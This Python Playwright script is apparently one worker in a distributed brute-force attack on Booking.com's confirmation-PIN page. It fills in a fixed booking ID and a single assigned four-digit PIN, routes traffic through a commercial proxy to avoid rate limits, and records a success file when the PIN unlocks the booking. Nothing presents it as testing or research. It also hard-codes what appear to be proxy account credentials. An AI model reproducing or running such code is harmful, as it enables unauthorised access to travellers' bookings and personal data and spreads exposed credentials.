#!/usr/bin/env python3
'''
🤖 INDEPENDENT AGENT #066
Booking ID: 5724349472
Assigned PIN: 9528
'''

from playwright.sync_api import sync_playwright
import os
import time
from datetime import datetime

# Agent Configuration
AGENT_ID = "AGENT_066"
BOOKING_ID = "5724349472"
ASSIGNED_PIN = "9528"
SCREENSHOTS_DIR = "screenshots"

# Proxy Configuration - Each agent gets unique proxy
PROXY_CONFIG = {
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}

def log_message(message):
    '''Log agent activity'''
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {AGENT_ID}: {message}"
    print(log_entry)
    
    # Write to agent's log file
    with open("agent_log.txt", "a", encoding="utf-8") as f:
        f.write(log_entry + "\n")

def test_pin():
    '''Main PIN testing function'''
    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
    
    log_message(f"🚀 Starting mission - Testing PIN {ASSIGNED_PIN} for booking {BOOKING_ID}")
    
    try:
        with sync_playwright() as p:
            # Launch browser with proxy
            log_message("🌐 Launching browser with proxy...")
            browser = p.chromium.launch(
                headless=False,  # Show browser for monitoring
                proxy=PROXY_CONFIG
            )
            page = browser.new_page()
            
            # Navigate to booking page
            log_message("🔄 Navigating to booking confirmation page...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                     wait_until="load", 
                     timeout=30000)
            
            # Wait for form to load
            log_message("⏳ Waiting for form elements to load...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
            
            # Fill booking ID
            log_message(f"📝 Filling booking ID: {BOOKING_ID}")
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            
            # Fill PIN
            log_message(f"🔑 Filling PIN: {ASSIGNED_PIN}")
            page.fill('input[placeholder="e.g. 1234"]', ASSIGNED_PIN)
            
            # Submit form
            log_message("🚀 Submitting form...")
            try:
                page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                page.click('button:has-text("Continue")')
            except Exception:
                page.wait_for_selector('button[type="submit"]', timeout=5000)
                page.click('button[type="submit"]')
            
            # Wait for result
            log_message("⏳ Waiting for result...")
            page.wait_for_function(
                '''
                () => {
                    return location.href.includes('unique_order_id') ||
                           document.querySelector('.bui-alert--error') !== null
                }
                ''',
                timeout=30000
            )
            
            current_url = page.url
            
            # Check result
            if "unique_order_id=" in current_url:
                # SUCCESS!
                log_message(f"🎉 SUCCESS! PIN {ASSIGNED_PIN} is CORRECT!")
                log_message(f"🔗 Success URL: {current_url}")
                
                # Take success screenshot
                page.screenshot(path=f"{SCREENSHOTS_DIR}/SUCCESS_{BOOKING_ID}_{ASSIGNED_PIN}.png")
                
                # Write success file
                with open("../SUCCESS_FOUND.txt", "w") as f:
                    f.write(f"SUCCESS|{AGENT_ID}|{ASSIGNED_PIN}|{current_url}|{datetime.now()}")
                
                log_message("🏆 MISSION ACCOMPLISHED! Success file created.")
                
                # Keep browser open for 10 seconds to show success
                time.sleep(10)
                browser.close()
                return True
                
            elif page.query_selector('.bui-alert--error'):
                # Failed
                log_message(f"❌ PIN {ASSIGNED_PIN} is incorrect")
                page.screenshot(path=f"{SCREENSHOTS_DIR}/FAIL_{BOOKING_ID}_{ASSIGNED_PIN}.png")
                time.sleep(2)  # Brief pause to see result
                browser.close()
                return False
                
            else:
                # Unknown result
                log_message(f"❓ Unknown result for PIN {ASSIGNED_PIN}")
                page.screenshot(path=f"{SCREENSHOTS_DIR}/UNKNOWN_{BOOKING_ID}_{ASSIGNED_PIN}.png")
                time.sleep(2)  # Brief pause to see result
                browser.close()
                return False
                
    except Exception as e:
        log_message(f"💥 Error during PIN test: {str(e)}")
        return False

if __name__ == "__main__":
    log_message("🤖 Agent initialized and ready for mission")
    success = test_pin()
    
    if success:
        log_message("✅ MISSION SUCCESS - PIN FOUND!")
    else:
        log_message("❌ Mission failed - PIN incorrect")
    
    log_message("🏠 Agent mission complete - returning home")
